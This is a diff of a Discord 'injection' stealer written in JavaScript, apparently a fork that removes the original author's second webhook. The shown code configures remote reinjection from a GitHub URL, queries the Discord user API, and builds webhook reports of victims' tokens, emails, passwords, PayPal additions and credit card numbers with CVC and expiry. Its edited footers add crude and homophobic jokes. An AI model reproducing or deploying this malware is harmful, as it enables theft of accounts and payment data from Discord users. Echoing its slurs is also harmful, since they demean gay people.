@@ -1,3 +1,11 @@
+/*
+Changes:
+* Undualhooked
+
+Warning:
+* I am not responsible for what losers or script kiddies use this for
+
+*/
 const args = process.argv;
 const fs = require('fs');
 const path = require('path');
@@ -11,13 +19,13 @@ const config = {
   auto_buy_nitro: false,
   ping_on_run: true,
   ping_val: '@everyone',
-  embed_name: 'zy injection ',
-  embed_icon: 'https://avatars.githubusercontent.com/u/99050671?v=4'.replace(/ /g, '%20'),
+  embed_name: 'gay injection',
+  embed_icon: 'https://files.catbox.moe/0coyk6.jpg'.replace(/ /g, '%20'),
   embed_color: 16630213,
   injection_url: 'https://raw.githubusercontent.com/zyIenox/dumb-stuff/main/injection.js', // for reinjection
-  /**
-   * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING @ATTENTION (ik what im doing, undualhooking this shit)
-   **/
+
+// injection below \\
+  
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
     boost: {
@@ -766,7 +774,7 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'discord injection by zy',
+          text: 'piss injection complete plz now reevaluate your life choices',
         },
       },
     ],
@@ -789,7 +797,7 @@ const PaypalAdded = async (token) => {
         fields: [
           {
             name: '**Paypal Added**',
-            value: `Time to buy some nitrooooo 😩`,
+            value: `Time to buy some nitrooooo and get arrested for credit card fraud!!!`,
             inline: false,
           },
           {
@@ -808,7 +816,7 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'discord injection by zy',
+          text: 'piss shit and ass injection',
         },
       },
     ],
@@ -850,7 +858,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'discord injection by zy',
+          text: 'tired of writing shit to put here',
         },
       },
     ],
@@ -894,7 +902,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'discord injection by zy',
+          text: 'homosexual discord injection',
         },
       },
     ],
